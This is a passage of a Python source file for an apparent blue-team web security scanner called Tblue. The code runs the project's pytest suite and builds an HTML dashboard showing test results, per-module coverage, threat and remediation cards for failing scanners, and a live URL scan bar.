            "Submit to the HSTS preload list at hstspreload.org for browser-level HTTPS enforcement",
            "Add upgrade-insecure-requests to Content-Security-Policy to upgrade HTTP sub-resources",
            "Ensure HTTP and HTTPS cookie attributes align; use __Secure- prefix for critical cookies",
        ],
    },
}

_SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
_SEV_COLOR = {
    "CRITICAL": "#ef4444",
    "HIGH":     "#f97316",
    "MEDIUM":   "#f59e0b",
    "LOW":      "#22c55e",
}


def _failing_scanner_modules(tests):
    """Return sorted list of unique (severity, module, info) for failing tests."""
    seen   = {}
    for t in tests:
        if t.get("outcome") not in ("failed", "error"):
            continue
        node = t.get("nodeid", "")
        parts = node.split("::")
        mod = Path(parts[0]).stem.replace("test_", "") if parts else ""
        if mod and mod not in seen:
            info = THREAT_INTEL.get(mod)
            seen[mod] = info
    results = [(mod, info) for mod, info in seen.items()]
    results.sort(key=lambda x: _SEV_ORDER.get(
        (x[1] or {}).get("severity", "LOW"), 3))
    return results


def _build_threat_section(tests):
    """Generate the HTML for the Active Threat Analysis section."""
    failing = _failing_scanner_modules(tests)
    if not failing:
        return '<p class="threat-clear">&#10003; All security scanners passing — no active threats detected.</p>'

    cards = []
    for mod, info in failing:
        if info is None:
            # Scanner has no threat mapping yet — show generic card
            cards.append(f"""
      <div class="threat-card sev-medium">
        <div class="threat-sev-label" style="color:#f59e0b">UNKNOWN</div>
        <div class="threat-title">{mod} scanner failure</div>
        <div class="threat-mod-label">{mod} scanner</div>
        <div class="threat-body">
          <p class="threat-note">Tests for the <strong>{mod}</strong> scanner are failing. Review the Failures panel for details.</p>
        </div>
      </div>""")
            continue

        sev   = info["severity"]
        color = _SEV_COLOR.get(sev, "#64748b")
        owasp = info.get("owasp", "")
        cwe   = info.get("cwe", "")
        refs  = f'<span class="threat-ref">{cwe}</span> <span class="threat-ref">{owasp}</span>' if cwe or owasp else ""

        threats_html = "".join(
            f'<li>{t}</li>' for t in info.get("threats", [])
        )
        remed_html = "".join(
            f'<li>{r}</li>' for r in info.get("remediation", [])
        )

        cards.append(f"""
      <div class="threat-card sev-{sev.lower()}">
        <div class="threat-sev-label" style="color:{color}">{sev}</div>
        <div class="threat-title">{info['short']}</div>
        <div class="threat-mod-label">{mod}.py &nbsp;{refs}</div>
        <div class="threat-body">
          <div class="threat-col">
            <h4 class="threat-col-title" style="color:{color}">Active Threats</h4>
            <ul class="threat-list threat-list-bad">{threats_html}</ul>
          </div>
          <div class="threat-col">
            <h4 class="threat-col-title" style="color:#22c55e">Remediation Steps</h4>
            <ol class="threat-list threat-list-good">{remed_html}</ol>
          </div>
        </div>
      </div>""")

    return f'<div class="threat-grid">{"".join(cards)}</div>'


def run_tests():
    print("Running test suite…")
    cmd = [
        sys.executable, "-m", "pytest", "tests/",
        "--json-report", f"--json-report-file={REPORT_JSON}",
        f"--cov=tblue.scanner",
        f"--cov-report=json:{COVERAGE_JSON}",
        "-q", "--no-header", "--tb=short",
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(result.stdout[-2000:] if len(result.stdout) > 2000 else result.stdout)
    if result.returncode not in (0, 1):  # 1 = some tests failed, still ok
        print(result.stderr[-1000:])


def load_json(path):
    with open(path) as f:
        return json.load(f)


def coverage_color(pct):
    if pct >= 95:  return "#22c55e"   # green
    if pct >= 80:  return "#f59e0b"   # amber
    return "#ef4444"                   # red


def status_badge(outcome):
    badges = {
        "passed":  ('<span class="badge pass">PASS</span>', "pass"),
        "failed":  ('<span class="badge fail">FAIL</span>', "fail"),
        "error":   ('<span class="badge error">ERROR</span>', "error"),
        "skipped": ('<span class="badge skip">SKIP</span>', "skip"),
    }
    return badges.get(outcome, ('<span class="badge skip">?</span>', "skip"))


def build_html(report, coverage):
    # ── Aggregate stats ───────────────────────────────────────────────────────
    summary   = report.get("summary", {})
    total     = summary.get("total", 0)
    passed    = summary.get("passed", 0)
    failed    = summary.get("failed", 0)
    errors    = summary.get("error", 0)
    skipped   = summary.get("skipped", 0)
    duration  = report.get("duration", 0)
    created   = datetime.fromtimestamp(report.get("created", datetime.now().timestamp()))

    pass_pct  = int(100 * passed / total) if total else 0

    # ── Coverage per module ───────────────────────────────────────────────────
    cov_files = coverage.get("files", {})
    modules = []
    for fpath, fdata in sorted(cov_files.items()):
        if "scanner" not in fpath or "__" in fpath:
            continue
        name   = Path(fpath).stem
        pct    = fdata.get("summary", {}).get("percent_covered", 0)
        stmts  = fdata.get("summary", {}).get("num_statements", 0)
        miss   = fdata.get("summary", {}).get("missing_lines", 0)
        modules.append((name, round(pct, 1), stmts, miss))

    total_stmts   = sum(m[2] for m in modules)
    total_miss    = sum(m[3] for m in modules)
    overall_cov   = round(100 * (total_stmts - total_miss) / total_stmts, 1) if total_stmts else 0
    modules_95    = sum(1 for m in modules if m[1] >= 95)

    # ── Test results grouped by scanner module ────────────────────────────────
    tests = report.get("tests", [])
    by_module = {}
    for t in tests:
        # nodeid like "tests/test_graphql.py::test_introspection"
        parts = t.get("nodeid", "").split("::")
        file_part = parts[0] if parts else "unknown"
        mod = Path(file_part).stem.replace("test_", "")
        by_module.setdefault(mod, []).append(t)

    # ── Failures detail ───────────────────────────────────────────────────────
    failures = [t for t in tests if t.get("outcome") in ("failed", "error")]

    # ── Threat intelligence section ───────────────────────────────────────────
    threat_section = _build_threat_section(tests)
    threat_accent  = "accent-red" if failures else "accent-green"
    threat_title   = "Active Threat Analysis" if failures else "Threat Status"

    # ── Build HTML ────────────────────────────────────────────────────────────
    module_rows = []
    for name, pct, stmts, miss in modules:
        color  = coverage_color(pct)
        bar_w  = int(pct)
        status = "✓" if pct >= 95 else ("▲" if pct >= 80 else "✗")
        icon_c = "icon-pass" if pct >= 95 else ("icon-warn" if pct >= 80 else "icon-fail")
        module_rows.append(f"""
        <tr class="cov-row" data-pct="{pct}">
          <td class="mod-name">{name}.py</td>
          <td class="cov-bar-cell">
            <div class="cov-bar-bg">
              <div class="cov-bar-fill" style="width:{bar_w}%;background:{color}"></div>
            </div>
          </td>
          <td class="pct-val" style="color:{color}">{pct}%</td>
          <td class="miss-val">{miss} miss</td>
          <td><span class="{icon_c}">{status}</span></td>
        </tr>""")

    test_rows = []
    for t in tests:
        outcome = t.get("outcome", "")
        badge, cls = status_badge(outcome)
        nodeid = t.get("nodeid", "")
        parts  = nodeid.split("::")
        mod    = Path(parts[0]).stem.replace("test_", "") if parts else ""
        tname  = parts[-1] if len(parts) > 1 else nodeid
        dur    = t.get("call", {}).get("duration", 0) if t.get("call") else 0
        test_rows.append(f"""
        <tr class="test-row {cls}" data-outcome="{outcome}" data-mod="{mod}">
          <td class="td-mod">{mod}</td>
          <td class="td-name" title="{nodeid}">{tname}</td>
          <td>{badge}</td>
          <td class="td-dur">{dur:.3f}s</td>
        </tr>""")

    fail_detail = []
    for t in failures:
        nodeid   = t.get("nodeid", "")
        call     = t.get("call", {}) or {}
        longrepr = call.get("longrepr", "") or ""
        short    = longrepr[:1200] + ("…" if len(longrepr) > 1200 else "")
        short    = short.replace("<", "&lt;").replace(">", "&gt;")
        fail_detail.append(f"""
        <div class="fail-card">
          <div class="fail-header">
            <span class="badge fail">FAIL</span>
            <code>{nodeid}</code>
          </div>
          <pre class="fail-body">{short}</pre>
        </div>""")

    fail_section = "\n".join(fail_detail) if fail_detail else '<p class="no-fail">No failures — all tests passing.</p>'

    # summary donut SVG (simple circle)
    donut_r = 54
    donut_c = 2 * 3.14159 * donut_r
    pass_dash = donut_c * pass_pct / 100
    fail_dash = donut_c - pass_dash

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Tblue — Blue Team Security Dashboard</title>
<style>
  :root {{
    --bg:        #0a0f1e;
    --panel:     #111827;
    --panel2:    #1a2234;
    --border:    #1e2d45;
    --accent:    #0ea5e9;
    --accent2:   #6366f1;
    --pass:      #22c55e;
    --fail:      #ef4444;
    --warn:      #f59e0b;
    --skip:      #64748b;
    --text:      #e2e8f0;
    --muted:     #64748b;
    --font:      'Segoe UI', system-ui, sans-serif;
    --mono:      'Cascadia Code', 'Fira Code', 'Courier New', monospace;
  }}
  * {{ box-sizing:border-box; margin:0; padding:0; }}
  body {{ background:var(--bg); color:var(--text); font-family:var(--font); font-size:14px; line-height:1.5; }}

  /* ── TOPBAR ── */
  .topbar {{
    background:linear-gradient(90deg, #0a0f1e 0%, #0d1f3c 50%, #0a0f1e 100%);
    border-bottom:1px solid var(--border);
    padding:18px 32px;
    display:flex; align-items:center; justify-content:space-between;
  }}
  .brand {{ display:flex; align-items:center; gap:14px; }}
  .brand-icon {{ font-size:28px; }}
  .brand-title {{ font-size:22px; font-weight:700; color:#fff; letter-spacing:.5px; }}
  .brand-sub {{ font-size:11px; color:var(--muted); letter-spacing:2px; text-transform:uppercase; }}
  .topbar-meta {{ text-align:right; }}
  .topbar-meta .ts {{ color:var(--muted); font-size:12px; }}
  .topbar-meta .label {{ font-size:11px; color:var(--accent); letter-spacing:1.5px; text-transform:uppercase; }}

  /* ── LAYOUT ── */
  .main {{ max-width:1600px; margin:0 auto; padding:24px 24px; }}
  .grid-4 {{ display:grid; grid-template-columns:repeat(4,1fr); gap:16px; margin-bottom:24px; }}
  .grid-2 {{ display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-bottom:24px; }}
  .grid-full {{ margin-bottom:24px; }}

  /* ── CARDS ── */
  .card {{
    background:var(--panel);
    border:1px solid var(--border);
    border-radius:10px;
    padding:20px 24px;
    position:relative;
    overflow:hidden;
  }}
  .card::before {{
    content:'';
    position:absolute; top:0; left:0; right:0; height:3px;
  }}
  .card.accent-blue::before   {{ background:var(--accent); }}
  .card.accent-green::before  {{ background:var(--pass); }}
  .card.accent-red::before    {{ background:var(--fail); }}
  .card.accent-amber::before  {{ background:var(--warn); }}
  .card.accent-indigo::before {{ background:var(--accent2); }}
  .card.accent-amber::before  {{ background:var(--warn); }}
  .card-label {{ font-size:11px; color:var(--muted); text-transform:uppercase; letter-spacing:1.5px; margin-bottom:8px; }}
  .card-value {{ font-size:36px; font-weight:700; line-height:1; }}
  .card-sub {{ font-size:12px; color:var(--muted); margin-top:6px; }}
  .val-pass {{ color:var(--pass); }}
  .val-fail {{ color:var(--fail); }}
  .val-warn {{ color:var(--warn); }}
  .val-blue {{ color:var(--accent); }}
  .val-indigo {{ color:var(--accent2); }}

  /* ── SECTION TITLES ── */
  .section-title {{
    font-size:13px; font-weight:600; text-transform:uppercase;
    letter-spacing:1.5px; color:var(--accent);
    border-bottom:1px solid var(--border);
    padding-bottom:10px; margin-bottom:16px;
    display:flex; align-items:center; gap:8px;
  }}
  .section-title::before {{ content:''; width:3px; height:16px; background:var(--accent); border-radius:2px; }}

  /* ── DONUT ── */
  .donut-wrap {{ display:flex; align-items:center; gap:32px; padding:8px 0; }}
  .donut-svg {{ flex-shrink:0; }}
  .donut-legend {{ display:flex; flex-direction:column; gap:10px; }}
  .leg-item {{ display:flex; align-items:center; gap:10px; font-size:13px; }}
  .leg-dot {{ width:12px; height:12px; border-radius:50%; flex-shrink:0; }}
  .leg-num {{ font-weight:700; font-size:16px; margin-left:auto; padding-left:16px; }}

  /* ── COVERAGE TABLE ── */
  .cov-table {{ width:100%; border-collapse:collapse; }}
  .cov-table th {{
    text-align:left; padding:8px 12px;
    font-size:11px; color:var(--muted); text-transform:uppercase; letter-spacing:1px;
    border-bottom:1px solid var(--border);
  }}
  .cov-table td {{ padding:7px 12px; border-bottom:1px solid #1a2234; }}
  .cov-row:hover td {{ background:#161f33; }}
  .mod-name {{ font-family:var(--mono); font-size:12px; color:var(--text); white-space:nowrap; }}
  .cov-bar-cell {{ width:200px; }}
  .cov-bar-bg {{ background:#1e2d45; border-radius:4px; height:8px; overflow:hidden; }}
  .cov-bar-fill {{ height:8px; border-radius:4px; transition:width .3s; }}
  .pct-val {{ font-weight:700; font-size:13px; font-family:var(--mono); width:56px; }}
  .miss-val {{ font-size:12px; color:var(--muted); font-family:var(--mono); }}
  .icon-pass {{ color:var(--pass); font-weight:700; }}
  .icon-warn {{ color:var(--warn); font-weight:700; }}
  .icon-fail {{ color:var(--fail); font-weight:700; }}

  /* ── TEST TABLE ── */
  .filter-bar {{ display:flex; gap:10px; margin-bottom:14px; flex-wrap:wrap; }}
  .filter-bar input {{
    background:#1a2234; border:1px solid var(--border); color:var(--text);
    padding:7px 12px; border-radius:6px; font-size:13px; flex:1; min-width:200px;
    outline:none;
  }}
  .filter-bar input:focus {{ border-color:var(--accent); }}
  .filter-btn {{
    background:#1a2234; border:1px solid var(--border); color:var(--muted);
    padding:7px 14px; border-radius:6px; font-size:12px; cursor:pointer;
    text-transform:uppercase; letter-spacing:.5px; transition:.15s;
  }}
  .filter-btn:hover, .filter-btn.active {{ background:var(--accent); color:#fff; border-color:var(--accent); }}
  .test-table {{ width:100%; border-collapse:collapse; }}
  .test-table th {{
    text-align:left; padding:9px 14px;
    font-size:11px; color:var(--muted); text-transform:uppercase; letter-spacing:1px;
    background:#0f1929; border-bottom:1px solid var(--border); position:sticky; top:0; z-index:2;
  }}
  .test-table td {{ padding:7px 14px; border-bottom:1px solid #131c2e; }}
  .test-row:hover td {{ background:#161f33; }}
  .td-mod {{ font-family:var(--mono); font-size:11px; color:var(--muted); white-space:nowrap; }}
  .td-name {{ font-family:var(--mono); font-size:12px; max-width:420px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }}
  .td-dur {{ font-family:var(--mono); font-size:11px; color:var(--muted); white-space:nowrap; }}

  /* ── BADGES ── */
  .badge {{
    display:inline-block; padding:3px 10px; border-radius:20px;
    font-size:11px; font-weight:700; letter-spacing:.5px; text-transform:uppercase;
  }}
  .badge.pass  {{ background:#052e16; color:var(--pass); border:1px solid #166534; }}
  .badge.fail  {{ background:#450a0a; color:var(--fail); border:1px solid #991b1b; }}
  .badge.error {{ background:#450a0a; color:#f87171; border:1px solid #991b1b; }}
  .badge.skip  {{ background:#1e293b; color:var(--muted); border:1px solid #334155; }}

  /* ── FAILURE CARDS ── */
  .fail-card {{
    background:#160c0c; border:1px solid #991b1b;
    border-radius:8px; margin-bottom:14px; overflow:hidden;
  }}
  .fail-header {{
    background:#1c0a0a; padding:10px 16px;
    display:flex; align-items:center; gap:10px;
    border-bottom:1px solid #991b1b;
  }}
  .fail-header code {{ font-family:var(--mono); font-size:12px; color:#fca5a5; }}
  .fail-body {{
    padding:14px 16px; font-family:var(--mono); font-size:11.5px;
    color:#fca5a5; white-space:pre-wrap; word-break:break-all;
    max-height:220px; overflow-y:auto; line-height:1.6;
  }}
  .no-fail {{ color:var(--pass); font-style:italic; padding:12px 0; }}

  /* ── SCROLLABLE PANEL ── */
  .scroll-panel {{ max-height:580px; overflow-y:auto; }}
  .scroll-panel::-webkit-scrollbar {{ width:6px; }}
  .scroll-panel::-webkit-scrollbar-track {{ background:#0f1929; }}
  .scroll-panel::-webkit-scrollbar-thumb {{ background:#1e2d45; border-radius:3px; }}

  /* ── PROGRESS RING ── */
  .ring-track {{ fill:none; stroke:#1e2d45; stroke-width:10; }}
  .ring-pass  {{ fill:none; stroke:var(--pass);  stroke-width:10; stroke-linecap:round; transform:rotate(-90deg); transform-origin:center; }}
  .ring-fail  {{ fill:none; stroke:var(--fail);  stroke-width:10; stroke-linecap:round; transform:rotate(-90deg); transform-origin:center; }}
  .ring-label {{ font-size:22px; font-weight:700; fill:#fff; text-anchor:middle; dominant-baseline:central; }}
  .ring-sub   {{ font-size:11px; fill:var(--muted); text-anchor:middle; }}

  /* ── SCAN BAR ── */
  .scanbar-wrap {{
    background:linear-gradient(135deg, #0d1b35 0%, #0f2040 50%, #0d1b35 100%);
    border-bottom:1px solid #1e3a5f;
    padding:32px 32px 28px;
  }}
  .scanbar-title {{
    font-size:12px; font-weight:700; text-transform:uppercase;
    letter-spacing:2.5px; color:var(--accent); margin-bottom:12px;
    display:flex; align-items:center; gap:8px;
  }}
  .scanbar-title::before {{ content:''; width:3px; height:14px; background:var(--accent); border-radius:2px; display:inline-block; }}
  .scanbar-row {{
    display:flex; gap:12px; align-items:center;
  }}
  .scanbar-input {{
    flex:1;
    background:#07122a;
    border:2px solid #1e3a5f;
    color:#f0f6ff;
    padding:16px 20px;
    border-radius:10px;
    font-size:16px;
    font-family:var(--mono);
    outline:none;
    transition:border-color .2s, box-shadow .2s;
    min-width:0;
  }}
  .scanbar-input::placeholder {{ color:#334d6e; }}
  .scanbar-input:focus {{
    border-color:var(--accent);
    box-shadow:0 0 0 3px rgba(14,165,233,.18);
  }}
  .scanbar-btn {{
    background:linear-gradient(135deg, #0ea5e9 0%, #6366f1 100%);
    color:#fff;
    border:none;
    padding:16px 32px;
    border-radius:10px;
    font-size:14px;
    font-weight:700;
    letter-spacing:.5px;
    cursor:pointer;
    white-space:nowrap;
    transition:opacity .15s, transform .1s;
    display:flex; align-items:center; gap:8px;
  }}
  .scanbar-btn:hover {{ opacity:.92; }}
  .scanbar-btn:active {{ transform:scale(.97); }}
  .scanbar-btn:disabled {{ opacity:.5; cursor:not-allowed; }}
  .scanbar-hint {{ font-size:11px; color:#334d6e; margin-top:8px; }}

  /* ── SCAN RESULTS ── */
  #scanResults {{ display:none; }}
  .scan-progress {{
    background:var(--panel); border:1px solid var(--border); border-radius:10px;
    padding:24px; margin-bottom:20px;
  }}
  .scan-progress-label {{ font-size:12px; color:var(--muted); margin-bottom:10px; letter-spacing:1px; text-transform:uppercase; }}
  .scan-progress-bar-bg {{ background:#1e2d45; border-radius:6px; height:10px; overflow:hidden; }}
  .scan-progress-bar {{ height:10px; border-radius:6px; background:linear-gradient(90deg,#0ea5e9,#6366f1); transition:width .4s; }}
  .scan-summary-row {{
    display:grid; grid-template-columns:repeat(4,1fr); gap:14px; margin-bottom:20px;
  }}
  .scan-stat {{ background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:16px 20px; text-align:center; }}
  .scan-stat-val {{ font-size:32px; font-weight:700; line-height:1; }}
  .scan-stat-lbl {{ font-size:11px; color:var(--muted); text-transform:uppercase; letter-spacing:1px; margin-top:6px; }}
  .scan-results-grid {{ display:grid; grid-template-columns:repeat(auto-fill,minmax(360px,1fr)); gap:14px; }}
  .scan-scanner-card {{
    background:var(--panel); border:1px solid var(--border); border-radius:8px; overflow:hidden;
  }}
  .scan-scanner-header {{
    display:flex; align-items:center; justify-content:space-between;
    padding:10px 14px; cursor:pointer; user-select:none;
    border-bottom:1px solid transparent;
    transition:background .15s;
  }}
  .scan-scanner-header:hover {{ background:#161f33; }}
  .scan-scanner-header.has-findings {{ border-bottom-color:var(--border); }}
  .scan-scanner-name {{ font-size:12px; font-weight:600; color:var(--text); }}
  .scan-scanner-cat {{ font-size:10px; color:var(--muted); letter-spacing:1px; text-transform:uppercase; margin-top:1px; }}
  .scan-badge-row {{ display:flex; gap:4px; align-items:center; }}
  .scan-count {{
    font-size:10px; font-weight:700; padding:2px 7px; border-radius:12px;
    display:inline-block;
  }}
  .sc-fail  {{ background:#450a0a; color:var(--fail); border:1px solid #991b1b; }}
  .sc-warn  {{ background:#3b2504; color:var(--warn); border:1px solid #92400e; }}
  .sc-pass  {{ background:#052e16; color:var(--pass); border:1px solid #166534; }}
  .sc-ok    {{ background:#1e2d45; color:var(--muted); border:1px solid #1e2d45; }}
  .scan-scanner-body {{ padding:0; }}
  .scan-finding {{
    padding:8px 14px; border-bottom:1px solid #131c2e; font-size:12px;
    display:flex; align-items:flex-start; gap:8px;
  }}
  .scan-finding:last-child {{ border-bottom:none; }}
  .scan-finding-dot {{ width:8px; height:8px; border-radius:50%; flex-shrink:0; margin-top:3px; }}
  .dot-fail {{ background:var(--fail); }}
  .dot-warn {{ background:var(--warn); }}
  .dot-pass {{ background:var(--pass); }}
  .scan-finding-text {{ color:var(--text); flex:1; }}
  .scan-finding-detail {{ color:var(--muted); font-size:11px; margin-top:2px; line-height:1.5; }}
  .scan-error {{ color:#f87171; font-size:11px; padding:8px 14px; font-family:var(--mono); }}
  .scan-chevron {{ color:var(--muted); font-size:12px; transition:transform .2s; }}
  .scan-scanner-card.collapsed .scan-chevron {{ transform:rotate(-90deg); }}
  .scan-collapsed-body {{ display:none; }}
  .scan-scanner-card.collapsed .scan-scanner-body {{ display:none; }}

  /* ── THREAT INTEL ── */
  .threat-clear {{
    color:var(--pass); font-size:15px; font-weight:500;
    padding:28px; text-align:center; letter-spacing:.3px;
  }}
  .threat-grid {{
    display:grid;
    grid-template-columns:repeat(auto-fill, minmax(380px, 1fr));
    gap:16px;
  }}
  .threat-card {{
    border-radius:8px; padding:16px 18px; border:1px solid;
    background:#0c1422;
  }}
  .sev-critical {{ border-color:#ef4444; background:#130a0a; }}
  .sev-high     {{ border-color:#f97316; background:#120d08; }}
  .sev-medium   {{ border-color:#f59e0b; background:#110f06; }}
  .sev-low      {{ border-color:#22c55e; background:#07110a; }}
  .threat-sev-label {{
    font-size:10px; font-weight:800; letter-spacing:2px;
    text-transform:uppercase; margin-bottom:4px;
  }}
  .threat-title {{
    font-size:15px; font-weight:700; color:#f8fafc; margin-bottom:2px;
  }}
  .threat-mod-label {{
    font-family:var(--mono); font-size:11px; color:var(--muted);
    margin-bottom:12px; display:flex; align-items:center; gap:8px; flex-wrap:wrap;
  }}
  .threat-ref {{
    background:#1e2d45; color:var(--accent); border-radius:4px;
    padding:1px 6px; font-size:10px; font-weight:600;
  }}
  .threat-body {{
    display:grid; grid-template-columns:1fr 1fr; gap:14px;
  }}
  .threat-col-title {{
    font-size:11px; font-weight:700; text-transform:uppercase;
    letter-spacing:1px; margin-bottom:6px;
  }}
  .threat-list {{ margin:0; padding:0; list-style:none; }}
  .threat-list li {{ font-size:12px; line-height:1.55; padding:2px 0 2px 16px; position:relative; }}
  .threat-list-bad  li::before {{ content:"⚠"; position:absolute; left:0; color:#ef4444; font-size:10px; top:3px; }}
  .threat-list-good li::before {{ content:"✓"; position:absolute; left:0; color:#22c55e; font-size:11px; top:2px; }}
  .threat-list-bad  li {{ color:#fca5a5; }}
  .threat-list-good li {{ color:#86efac; }}
  .threat-note {{ color:var(--muted); font-size:12px; margin:0; }}
  @media(max-width:700px) {{
    .threat-body {{ grid-template-columns:1fr; }}
    .threat-grid {{ grid-template-columns:1fr; }}
  }}

  /* ── FOOTER ── */
  .footer {{ text-align:center; padding:28px; color:var(--muted); font-size:11px; border-top:1px solid var(--border); margin-top:24px; }}
  .footer span {{ color:var(--accent); }}

  /* ── RESPONSIVE ── */
  @media(max-width:900px) {{
    .grid-4 {{ grid-template-columns:repeat(2,1fr); }}
    .grid-2 {{ grid-template-columns:1fr; }}
  }}
</style>
</head>
<body>

<!-- TOPBAR -->
<div class="topbar">
  <div class="brand">
    <div class="brand-icon">🛡️</div>
    <div>
      <div class="brand-title">Tblue</div>
      <div class="brand-sub">Blue Team Security Scanner</div>
    </div>
  </div>
  <div class="topbar-meta">
    <div class="label">Test Suite Report</div>
    <div class="ts">{created.strftime('%Y-%m-%d %H:%M:%S')}</div>
    <div class="ts">Duration: {duration:.1f}s</div>
  </div>
</div>

<!-- SCAN BAR -->
<div class="scanbar-wrap">
  <div class="scanbar-title">Live URL Scanner</div>
  <div class="scanbar-row">
    <input id="scanUrl" class="scanbar-input" type="url"
           placeholder="https://example.com  — enter any URL to scan now"
           autocomplete="off" spellcheck="false">
    <button id="scanBtn" class="scanbar-btn">&#9654; Scan</button>
  </div>
  <div class="scanbar-hint" id="scanHint">
    Runs 50+ security scanners in parallel. Powered by Tblue blue-team analysis.
  </div>
</div>

<!-- LIVE SCAN RESULTS -->
<div id="scanResults" class="main" style="padding-bottom:0">
  <div class="scan-progress">
    <div class="scan-progress-label" id="scanProgressLabel">Initializing…</div>
    <div class="scan-progress-bar-bg">
      <div class="scan-progress-bar" id="scanProgressBar" style="width:0%"></div>
    </div>
  </div>
  <div class="scan-summary-row" id="scanSummary" style="display:none">
    <div class="scan-stat card accent-red">
      <div class="scan-stat-val val-fail" id="scanCountFail">—</div>
      <div class="scan-stat-lbl">Critical Findings</div>
    </div>
    <div class="scan-stat card accent-amber" style="--before-bg:#f59e0b">
      <div class="scan-stat-val val-warn" id="scanCountWarn">—</div>
      <div class="scan-stat-lbl">Warnings</div>
    </div>
    <div class="scan-stat card accent-green">
      <div class="scan-stat-val val-pass" id="scanCountPass">—</div>
      <div class="scan-stat-lbl">Passing Checks</div>
    </div>
    <div class="scan-stat card accent-blue">
      <div class="scan-stat-val val-blue" id="scanCountTotal">—</div>
      <div class="scan-stat-lbl">Total Findings</div>
    </div>
  </div>
  <div class="scan-results-grid" id="scanCards"></div>
</div>

<div class="main">

  <!-- SUMMARY CARDS -->
  <div class="grid-4">
    <div class="card accent-blue">
      <div class="card-label">Total Tests</div>
      <div class="card-value val-blue">{total}</div>
      <div class="card-sub">{len(modules)} scanner modules</div>
    </div>
    <div class="card accent-green">
      <div class="card-label">Passed</div>
      <div class="card-value val-pass">{passed}</div>
      <div class="card-sub">{pass_pct}% success rate</div>
    </div>
    <div class="card accent-red">
      <div class="card-label">Failed / Error</div>
      <div class="card-value val-fail">{failed + errors}</div>
      <div class="card-sub">{skipped} skipped</div>
    </div>
    <div class="card accent-indigo">
      <div class="card-label">Overall Coverage</div>
      <div class="card-value val-indigo">{overall_cov}%</div>
      <div class="card-sub">{modules_95}/{len(modules)} modules ≥ 95%</div>
    </div>
  </div>

  <!-- THREAT INTELLIGENCE -->
  <div class="grid-full">
    <div class="card {threat_accent}">
      <div class="section-title">{threat_title}</div>
      {threat_section}
    </div>
  </div>

  <!-- DONUT + FAILURES -->
  <div class="grid-2">
    <div class="card accent-blue">
      <div class="section-title">Test Outcome Distribution</div>
      <div class="donut-wrap">
        <svg class="donut-svg" width="140" height="140" viewBox="0 0 140 140">
          <circle class="ring-track" cx="70" cy="70" r="{donut_r}"/>
          <circle class="ring-pass" cx="70" cy="70" r="{donut_r}"
            stroke-dasharray="{pass_dash:.1f} {donut_c:.1f}"
            stroke-dashoffset="0"/>
          <text class="ring-label" x="70" y="66">{pass_pct}%</text>
          <text class="ring-sub" x="70" y="84">passing</text>
        </svg>
        <div class="donut-legend">
          <div class="leg-item">
            <div class="leg-dot" style="background:var(--pass)"></div>
            <span>Passed</span>
            <span class="leg-num" style="color:var(--pass)">{passed}</span>
          </div>
          <div class="leg-item">
            <div class="leg-dot" style="background:var(--fail)"></div>
            <span>Failed</span>
            <span class="leg-num" style="color:var(--fail)">{failed}</span>
          </div>
          <div class="leg-item">
            <div class="leg-dot" style="background:#f87171"></div>
            <span>Error</span>
            <span class="leg-num" style="color:#f87171">{errors}</span>
          </div>
          <div class="leg-item">
            <div class="leg-dot" style="background:var(--muted)"></div>
            <span>Skipped</span>
            <span class="leg-num" style="color:var(--muted)">{skipped}</span>
          </div>
        </div>
      </div>
    </div>

    <div class="card accent-red">
      <div class="section-title">Failures & Errors</div>
      <div class="scroll-panel">
        {fail_section}
      </div>
    </div>
  </div>

  <!-- COVERAGE PER MODULE -->
  <div class="grid-full">
    <div class="card accent-indigo">
      <div class="section-title">Module Coverage</div>
      <div class="scroll-panel">
        <table class="cov-table">
          <thead>
            <tr>
              <th>Module</th>
              <th>Coverage</th>
              <th>%</th>
              <th>Missing</th>
              <th></th>
            </tr>
          </thead>
          <tbody>
            {''.join(module_rows)}
          </tbody>
        </table>
      </div>
    </div>
  </div>

  <!-- TEST RESULTS TABLE -->
  <div class="grid-full">
    <div class="card accent-green">
      <div class="section-title">All Tests</div>
      <div class="filter-bar">
        <input type="text" id="searchInput" placeholder="Search by test name or module…" oninput="filterTests()">
        <button class="filter-btn active" onclick="filterOutcome('all', this)">All</button>
        <button class="filter-btn" onclick="filterOutcome('passed', this)">Passed</button>
        <button class="filter-btn" onclick="filterOutcome('failed', this)">Failed</button>
        <button class="filter-btn" onclick="filterOutcome('skipped', this)">Skipped</button>
      </div>
      <div class="scroll-panel">
        <table class="test-table" id="testTable">
          <thead>
            <tr>
              <th>Module</th>
              <th>Test Name</th>
              <th>Status</th>
              <th>Duration</th>
            </tr>
          </thead>
          <tbody id="testBody">
            {''.join(test_rows)}
          </tbody>
        </table>
      </div>
    </div>
  </div>

</div><!-- .main -->

<div class="footer">
  Generated by <span>Tblue Dashboard Generator</span> &nbsp;·&nbsp;
  {created.strftime('%Y-%m-%d %H:%M UTC')} &nbsp;·&nbsp;
  {total} tests across {len(modules)} scanner modules
</div>

<script>
let activeOutcome = 'all';

function filterTests() {{
  const q     = document.getElementById('searchInput').value.toLowerCase();
  const rows  = document.querySelectorAll('#testBody .test-row');
  rows.forEach(row => {{
    const mod  = row.querySelector('.td-mod').textContent.toLowerCase();
    const name = row.querySelector('.td-name').textContent.toLowerCase();
    const out  = row.dataset.outcome;
    const matchText    = !q || mod.includes(q) || name.includes(q);
    const matchOutcome = activeOutcome === 'all' || out === activeOutcome;
    row.style.display = matchText && matchOutcome ? '' : 'none';
  }});
}}

function filterOutcome(outcome, btn) {{
  activeOutcome = outcome;
  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  filterTests();
}}

// Sort coverage table by % descending on load
document.addEventListener('DOMContentLoaded', () => {{
  const tbody = document.querySelector('.cov-table tbody');
  const rows  = Array.from(tbody.querySelectorAll('tr'));
  rows.sort((a, b) => parseFloat(a.dataset.pct) - parseFloat(b.dataset.pct));
  rows.forEach(r => tbody.appendChild(r));
}});
</script>
<script>
// ── URL Scan bar ─────────────────────────────────────────────────────────────
const API_BASE = window.location.origin.startsWith("file:") ? "http://127.0.0.1:8080" : "";
let _scanActive = false;

document.addEventListener('DOMContentLoaded', () => {{
  const inp = document.getElementById('scanUrl');
